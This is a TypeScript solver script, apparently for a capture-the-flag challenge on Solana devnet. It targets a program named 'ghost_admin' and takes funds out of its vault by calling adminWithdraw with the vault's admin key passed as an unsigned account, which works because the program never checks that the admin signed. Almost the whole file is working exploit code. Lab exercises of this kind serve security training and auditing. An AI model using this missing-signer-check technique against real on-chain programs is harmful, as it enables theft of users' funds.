import * as anchor from "@coral-xyz/anchor";
import * as web3 from "@solana/web3.js";
import * as fs from "fs";
import * as path from "path";

async function main() {
  // Connect to devnet
  const connection = new web3.Connection("https://api.devnet.solana.com", "confirmed");

  // Load the ctf_wallet keypair
  const walletPath = path.join(__dirname, "../ctf_wallet.json");
  const walletSecret = JSON.parse(fs.readFileSync(walletPath, "utf-8"));
  const keypair = web3.Keypair.fromSecretKey(new Uint8Array(walletSecret));
  console.log("Using solver wallet:", keypair.publicKey.toBase58());

  // Setup Anchor provider
  const wallet = new anchor.Wallet(keypair);
  const provider = new anchor.AnchorProvider(connection, wallet, {
    commitment: "confirmed",
  });
  anchor.setProvider(provider);

  const programId = new web3.PublicKey("As9phEyQ89EecwUXtcVuJcwsvF2vspa7Je8qha7cDS25");
  
  // Load IDL
  const idlPath = path.join(__dirname, "ghost_admin.json");
  const idl = JSON.parse(fs.readFileSync(idlPath, "utf-8"));

  // Cast program to any to bypass strict type check on dynamically loaded IDL
  const program = new anchor.Program(idl, provider) as any;

  // Derive vault PDA: seeds = [b"vault"]
  const [vaultPda] = web3.PublicKey.findProgramAddressSync(
    [Buffer.from("vault")],
    programId
  );
  console.log("Vault PDA:", vaultPda.toBase58());

  // Fetch vault data
  // Try fetching using 'vault' first
  let vaultData: any;
  try {
    vaultData = await program.account.vault.fetch(vaultPda);
  } catch (err) {
    console.log("Failed fetching with 'vault', trying 'Vault'...");
    vaultData = await program.account.Vault.fetch(vaultPda);
  }
  console.log("Vault Admin Address:", vaultData.admin.toBase58());

  // Build the exploit instruction
  console.log("Sending exploit transaction...");
  const tx = new web3.Transaction().add(
    await program.methods
      .adminWithdraw()
      .accounts({
        admin: vaultData.admin, // Pass the vault's admin key (which is NOT checked for signer status)
        vault: vaultPda,
      })
      .instruction()
  );

  // Send transaction
  const txSig = await web3.sendAndConfirmTransaction(connection, tx, [keypair]);
  console.log("Transaction Signature:", txSig);

  // Fetch transaction details to print logs and grab the flag
  const txDetails = await connection.getTransaction(txSig, {
    commitment: "confirmed",
    maxSupportedTransactionVersion: 0,
  });

  console.log("--- Transaction Logs ---");
  if (txDetails?.meta?.logMessages) {
    txDetails.meta.logMessages.forEach((log) => {
      console.log(log);
    });
  } else {
    console.log("No logs found or transaction details couldn't be retrieved.");
  }
}

main().catch((err) => {
  console.error("Execution failed:", err);
});
